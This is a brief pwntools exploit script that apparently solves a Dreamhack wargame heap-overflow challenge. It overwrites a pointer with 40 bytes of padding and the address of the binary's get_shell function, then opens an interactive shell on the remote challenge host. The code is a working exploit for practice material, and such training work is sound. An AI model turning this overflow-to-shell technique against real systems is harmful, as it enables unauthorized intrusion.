#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  11176
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./basic_heap_overflow', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x080486fc
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

input()
pl = b"A"*0x28 + p32(exe.sym.get_shell)
p.sendline(pl)

p.interactive()
